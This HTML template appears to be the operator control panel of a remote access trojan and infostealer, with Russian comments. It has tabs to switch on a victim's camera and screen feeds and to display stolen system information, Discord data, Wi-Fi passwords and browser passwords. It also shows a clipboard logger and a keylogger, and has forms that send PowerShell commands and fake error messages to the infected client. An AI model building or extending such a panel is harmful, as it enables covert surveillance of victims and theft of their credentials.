<!DOCTYPE html>
<html>
<head>
    <title>Client {{ clientId }}</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <style>
        .square-form {
            width: 300px;
            height: 300px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            margin-right: 0;
            margin-top: 20px; /* Отступ сверху */
        }
        .container {
            margin-left: 0px;
            padding-left: 0px;
        }
        .square-form input {
            margin-bottom: 10px;
        }
        .square-form button {
            margin-top: 10px;
        }
        .form-header {
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
            font-size: 1.25rem;
        }
    </style>
</head>
<body>
    <a href="/">
        <button class="btn btn-secondary btn-lg">Back</button>
    </a>
    <br><br>

    <ul class="nav nav-tabs" id="myTab" role="tablist">
        <li class="nav-item" role="presentation">
            <button class="nav-link active" id="screen-tab" data-bs-toggle="tab" data-bs-target="#screen" type="button" role="tab" aria-controls="screen" aria-selected="true">screen and camera</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="stealer-tab" data-bs-toggle="tab" data-bs-target="#stealer" type="button" role="tab" aria-controls="stealer" aria-selected="false">stealer</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="loggers-tab" data-bs-toggle="tab" data-bs-target="#loggers" type="button" role="tab" aria-controls="loggers" aria-selected="false">loggers</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="console-tab" data-bs-toggle="tab" data-bs-target="#console" type="button" role="tab" aria-controls="console" aria-selected="false">console</button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="test2-tab" data-bs-toggle="tab" data-bs-target="#test2" type="button" role="tab" aria-controls="test2" aria-selected="false">test2</button>
        </li>

    </ul>
    <div class="tab-content" id="myTabContent">
        <div class="tab-pane fade show active" id="screen" role="tabpanel" aria-labelledby="screen-tab">
            <div class="form-check form-switch mb-3">
                <input class="form-check-input" type="checkbox" role="switch" id="enableCamera">
                <label class="form-check-label" for="enableCamera">Enable camera</label>
            </div>

            <div id="cameraWindow" class="mb-3" style="display: none;">
                <img id="camera-feed" src="/get_camera_frame?id={{ clientId }}" alt="Video Feed" class="img-fluid">
                <!-- Поле ввода для скорости обновления -->
                <label for="update-interval" class="form-label mt-2">Скорость обновления (в миллисекундах):</label>
                <input type="number" id="update-interval" class="form-control" value="1000">
            </div>

            <div class="form-check form-switch mb-3">
                <input class="form-check-input" type="checkbox" role="switch" id="enableScreen">
                <label class="form-check-label" for="enableScreen">Enable screen</label>
            </div>

            <div id="screenWindow" class="mb-3" style="display: none;">
                <img id="screen-feed" src="/get_screen_frame?id={{ clientId }}" alt="Screen Feed" class="img-fluid" style="max-width: 1000px;">
                <!-- Поле ввода для скорости обновления экрана -->
                <label for="screen-update-interval" class="form-label mt-2">Скорость обновления (в миллисекундах):</label>
                <input type="number" id="screen-update-interval" class="form-control" value="1000">
            </div>
        </div>
        <div class="tab-pane fade" id="stealer" role="tabpanel" aria-labelledby="stealer-tab">
            <h1 class="text-center">Stealer:</h1>
            <div class="container-fluid">
                <div class="row">
                    <div class="mw-50 col border border-2 border-black">
                        <h2>Pc information:</h2>
                        <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#systemContent" aria-expanded="false" aria-controls="systemContent">
                            Toggle
                        </button>
                        <div class="collapse mt-2" id="systemContent">
                            <h4>{{ systeminfo | safe }}</h4>
                        </div>

                    </div>
                    <div class="mw-50 col border border-2 border-black">
                        <h2>Discord:</h2>
                        <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#discordContent" aria-expanded="false" aria-controls="discordContent">
                            Toggle
                        </button>
                        <div class="collapse mt-2" id="discordContent">
                            <h4>{{ Discordinfo | safe }}</h4>
                        </div>
                        <h2>Wifi passwords:</h2>
                        <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#wifiContent" aria-expanded="false" aria-controls="wifiContent">
                            Toggle
                        </button>
                        <div class="collapse mt-2" id="wifiContent">
                            <h4>SSID: | Password:</h4>
                            <h5>{{ Wifis | safe }}</h5>
                        </div>
                        <h3>Passwords:</h3>
                        <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#passwordsContent" aria-expanded="false" aria-controls="passwordsContent">
                            Toggle
                        </button>
                        <div class="collapse mt-2" id="passwordsContent">
                            <h5>{{ browserPasswords | safe }}</h5>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="tab-pane fade" id="loggers" role="tabpanel" aria-labelledby="loggers-tab">
            <h1 class="text-center">Loggers:</h1>
            <div class="container-fluid">
                <div class="row">
                    <div class="col border border-2 border-black">
                        <h2>ClipboardLogger:</h2>
                        <h3 id="clipboard"></h3>
                    </div>
                    <div class="col border border-2 border-black">
                        <h2>KeyLogger:</h2>
                        <h3>Not working</h3>
                    </div>
                </div>
            </div>
        </div>
        <div class="tab-pane fade" id="console" role="tabpanel" aria-labelledby="console-tab">
            <div class="container">
                <div class="d-flex">
                    <form class="square-form" id="errorForm">
                        <div class="form-header">Send error</div>
                        <div class="mb-3 w-100">
                            <label for="errorName" class="form-label">Error name</label>
                            <input type="text" class="form-control" id="errorName">
                        </div>
                        <div class="mb-3 w-100">
                            <label for="errorDescription" class="form-label">Error description</label>
                            <input type="text" class="form-control" id="errorDescription">
                        </div>
                        <button type="submit" class="btn btn-primary">Send</button>
                    </form>
                    <form class="square-form">
                        <div class="form-header">Send powershell command</div>
                        <div class="mb-3 w-100">
                            <label for="powershellCommand" class="form-label">command</label>
                            <input type="text" class="form-control" id="powershellCommand">
                        </div>
                        <button type="button" class="btn btn-primary" onclick="handleSubmit()">send</button>
                    </form>
                </div>
            </div>

            <h1 class="text-center">Console:</h1>
            <form id="myForm" onsubmit="sendConsole(event)">
                <input type="text" name="user_input" placeholder="Введите текст">
                <button type="submit">Отправить</button>
            </form>
        </div>
        <div class="tab-pane fade" id="test2" role="tabpanel" aria-labelledby="test2-tab">
            <h1 class="text-center">Hueta:</h1>
        </div>

    </div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    <script>
        function autoRefresh() {
            const img = document.getElementById('camera-feed');
            const intervalInput = document.getElementById('update-interval');
            const enableCamera = document.getElementById('enableCamera').checked;

            const updateInterval = parseInt(intervalInput.value);

            if (enableCamera) {
                img.src = "/get_camera_frame?id={{ clientId }}";
            }

            setTimeout(autoRefresh, updateInterval);
        }

        function screenAutoRefresh() {
            const screenImg = document.getElementById('screen-feed');
            const screenIntervalInput = document.getElementById('screen-update-interval');
            const enableScreen = document.getElementById('enableScreen').checked;

            const screenUpdateInterval = parseInt(screenIntervalInput.value);

            if (enableScreen) {
                screenImg.src = "/get_screen_frame?id={{ clientId }}";
            }

            setTimeout(screenAutoRefresh, screenUpdateInterval);
        }

        function sendPostRequest(url, data) {
            data.clientId = "{{ clientId }}";

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => response.json())
              .then(data => console.log('Success:', data))
              .catch((error) => console.error('Error:', error));
        }

        document.getElementById('enableCamera').addEventListener('change', function() {
            const cameraWindow = document.getElementById('cameraWindow');
            const state = this.checked ? 1 : 0;
            sendPostRequest('/toggle_camera', { state: state });

            if (this.checked) {
                cameraWindow.style.display = 'block';
                autoRefresh(); // Запускаем обновление при включении
            } else {
                cameraWindow.style.display = 'none';
            }
        });

        document.getElementById('enableScreen').addEventListener('change', function() {
            const screenWindow = document.getElementById('screenWindow');
            const state = this.checked ? 1 : 0;
            sendPostRequest('/toggle_screen', { state: state });

            if (this.checked) {
                screenWindow.style.display = 'block';
                screenAutoRefresh(); // Запускаем обновление при включении
            } else {
                screenWindow.style.display = 'none';
            }
        });

        document.getElementById('errorForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the form from submitting normally

            // Get values from the form
            const errorName = document.getElementById('errorName').value;
            const errorDescription = document.getElementById('errorDescription').value;

            // Create data object to send
            const data = {
                command: "error",
                ErrorName: errorName,
                ErrorText: errorDescription
            };

            // URL to send the data
            const url = '/send_console';

            // Call the function to send the POST request
            sendPostRequest(url, data);
        });

        // Запуск начального состояния автообновления
        autoRefresh();
        screenAutoRefresh();
    </script>
</body>
</html>
